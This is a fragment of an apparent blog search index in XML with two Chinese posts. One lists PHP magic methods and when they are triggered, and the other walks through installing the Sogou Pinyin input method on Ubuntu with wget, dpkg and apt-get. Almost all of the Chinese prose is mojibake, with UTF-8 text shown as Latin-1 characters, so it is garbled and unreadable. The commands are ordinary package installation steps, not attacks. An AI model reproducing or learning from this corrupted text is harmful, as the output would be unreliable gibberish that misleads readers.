ä¸‰ã€é­”æœ¯æ–¹æ³•å…·ä½“çš„å¤§å®¶å¯ä»¥çœ‹phpæ‰‹å†Œä¹‹é­”æœ¯æ–¹æ³•è¿™è¾¹å°±åªæ˜¯ç®€å•ä»‹ç»ä¸‹ä»–ä»¬ä½•æ—¶ä¼šè§¦å‘ 1ã€__construct,æ„é€ å‡½æ•°ï¼Œå…·æœ‰æ„é€ å‡½æ•°çš„ç±»ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•ï¼ˆå®ä¾‹åŒ–å¯¹è±¡æ—¶ï¼‰ 2ã€__destruct,è§£æå‡½æ•°ï¼Œææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚ï¼ˆç±»å¯¹è±¡ä½¿ç”¨ç»“æŸæ—¶è‡ªåŠ¨è°ƒç”¨ï¼‰ 3ã€å±æ€§é‡è½½åœ¨ç»™ä¸å¯è®¿é—®ï¼ˆæœªå®šä¹‰ï¼‰å±æ€§èµ‹å€¼æ—¶ï¼Œ__set() ä¼šè¢«è°ƒç”¨ã€‚ è¯»å–ä¸å¯è®¿é—®ï¼ˆæœªå®šä¹‰ï¼‰å±æ€§çš„å€¼æ—¶ï¼Œ__get() ä¼šè¢«è°ƒç”¨ã€‚ å½“å¯¹ä¸å¯è®¿é—®ï¼ˆæœªå®šä¹‰ï¼‰å±æ€§è°ƒç”¨ isset() æˆ– empty() æ—¶ï¼Œ__isset() ä¼šè¢«è°ƒç”¨ã€‚ å½“å¯¹ä¸å¯è®¿é—®ï¼ˆæœªå®šä¹‰ï¼‰å±æ€§è°ƒç”¨ unset() æ—¶ï¼Œ__unset() ä¼šè¢«è°ƒç”¨ã€‚æ³¨æ„çš„æ˜¯ï¼šè¿™äº›é­”æœ¯æ–¹æ³•çš„å‚æ•°éƒ½ä¸èƒ½é€šè¿‡å¼•ç”¨ä¼ é€’ 4ã€æ–¹æ³•é‡è½½åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__call() ä¼šè¢«è°ƒç”¨ã€‚ åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__callStatic() ä¼šè¢«è°ƒç”¨ 5ã€__sleep(),serialize() å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ 6ã€ __wakeup ï¼Œä¸ä¹‹ç›¸åï¼Œunserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚__wakeup() ç»å¸¸ç”¨åœ¨ååºåˆ—åŒ–æ“ä½œä¸­ã€‚ 7ã€__toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚æ­¤æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦åˆ™å°†å‘å‡ºä¸€æ¡ E_RECOVERABLE_ERROR çº§åˆ«çš„è‡´å‘½é”™è¯¯ æ³¨æ„ï¼ï¼ï¼ï¼ä¸èƒ½åœ¨ __toString() æ–¹æ³•ä¸­æŠ›å‡ºå¼‚å¸¸ã€‚è¿™ä¹ˆåšä¼šå¯¼è‡´è‡´å‘½é”™è¯¯ã€‚ 8ã€__invoke()å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚æ³¨æ„ï¼šåœ¨PHP5.3.0ç‰ˆæœ¬ä¸Šæ‰æœ‰æ•ˆ 9ã€ __set_state()ï¼Œè‡ª PHP 5.1.0 èµ·å½“è°ƒç”¨ var_export() å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€ æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ 10ã€__clone(),å½“ä½¿ç”¨__clone()å¤åˆ¶ä¸€ä¸ªå¯¹è±¡æ—¶å€™è°ƒç”¨ã€‚ 11ã€__debugInfo ( ) :ï¼Œåœ¨è½¬å‚¨å¯¹è±¡ä»¥è·å–åº”è¯¥æ˜¾ç¤ºçš„å±æ€§æ—¶ï¼Œvar_dump()è°ƒç”¨æ­¤æ–¹æ³•ã€‚å¦‚æœæ–¹æ³•æ²¡æœ‰åœ¨å¯¹è±¡ä¸Šå®šä¹‰ï¼Œé‚£ä¹ˆå°†æ˜¾ç¤ºæ‰€æœ‰å…¬å…±ã€å—ä¿æŠ¤å’Œç§æœ‰å±æ€§ã€‚]]></content>
      <categories>
        <category>PHPåŸºç¡€</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntuç³»ç»Ÿå®‰è£…æœç‹—è¾“å…¥æ³•]]></title>
    <url>%2F2019%2F02%2F27%2Fpostname%2F</url>
    <content type="text"><![CDATA[ubuntué»˜è®¤æ˜¯å­—æ¯ï¼Œå½“ç„¶æœ‰ä¸­æ–‡è¾“å…¥æ³•fcixtx(å°ä¼é¹…è¾“å…¥æ³•)ï¼Œä½†æ˜¯æˆ‘ä¸æ€ä¹ˆå–œæ¬¢ç”¨ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥å®‰è£…æœç‹—è¾“å…¥æ³•ä¸‹è½½å‘½ä»¤å…¨éƒ¨åœ¨ç»ˆç«¯ä¸­æ‰§è¡Œ ä¸€ã€ä¸‹è½½æœç‹—è¾“å…¥æ³•çš„å®‰è£…åŒ…â€‹ ä¸‹è½½åœ°å€ä¸ºï¼šhttp://pinyin.sogou.com/linux/ 12ä¸‹è½½å‘½ä»¤wget &quot;http://cdn2.ime.sogou.com/dl/index/1524572264/sogoupinyin_2.2.0.0108_amd64.deb?st=tQdHKEaxh6PcyFVf4QfT1A&amp;e=1539855246&amp;fn=sogoupinyin_2.2.0.0108_amd64.deb&quot; æ³¨æ„ï¼šè¦é€‰æ‹©ä¸è‡ªå·±ç³»ç»Ÿç›¸å¯¹åº”çš„å®‰è£…åŒ…ï¼Œæˆ‘çš„ç³»ç»Ÿæ˜¯ubuntu64ä½ï¼Œæ‰€ä»¥æˆ‘ä¸‹è½½64ä½çš„å®‰è£…åŒ… äºŒã€æŸ¥çœ‹æ˜¯å¦ä¸‹è½½æˆåŠŸè¾“å…¥å‘½ä»¤ls -l ä¸‰ã€å®‰è£…æœç‹—è¾“å…¥æ³•å®‰è£…åŒ…1sudo dpkg -i sogoupinyin_2.2.0.0082_amd64.deb//-iåé¢ä¸ºæˆ‘ä»¬ä¸‹è½½çš„å®‰è£…åŒ…çš„æ–‡ä»¶å å››ã€é€‰æ‹©fcitxè¾“å…¥æ³•ä»ç³»ç»Ÿè®¾ç½®é‡Œé¢ç‚¹å‡»â€œè¯­è¨€æ”¯æŒâ€ï¼Œä»è¯­è¨€æ”¯æŒé‡Œé¢é€‰æ‹©å°ä¼é¹…è¾“å…¥æ³•ï¼ˆfcitxï¼‰ï¼Œé»˜è®¤ä¸ºibusï¼Œæœç‹—è¾“å…¥è¦å®‰è£…åœ¨fcitxè¾“å…¥æ³•ä¸Šé¢ã€‚ä½ å¯èƒ½ä¼šæ‰“ä¸å¼€â€œè¯­è¨€æ”¯æŒâ€ï¼Œåªéœ€æ‰§è¡Œå‘½ä»¤sudo apt-get install -f å³å¯ä¿®å¤é”™è¯¯ï¼Œæ‰“å¼€è¯­éŸ³æ”¯æŒ å¦‚æœæ²¡æœ‰å°ä¼é¹…è¾“å…¥æ³•çš„è¯æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ 12sudo apt-get updatesudo apt-get upgrade 1ã€é‡å¯ï¼ˆå¯ä»¥ä½¿ç”¨å‘½ä»¤rebootï¼‰ç„¶ååœ¨ç³»ç»Ÿè®¾ç½®ä¸­é€‰æ‹© fcitx configure,ç„¶åæŒ‰ä¸‹å›¾æ“ä½œ å…­ã€å®‰è£…ä¸­æ–‡è¯­è¨€æ“ä½œå¦‚ä¸‹å›¾ç­‰ä»–ä¸‹è½½å®Œæˆåæœ€åé‡å¯ï¼Œå¤§åŠŸå‘Šæˆ]]></content>
  </entry>
</search>
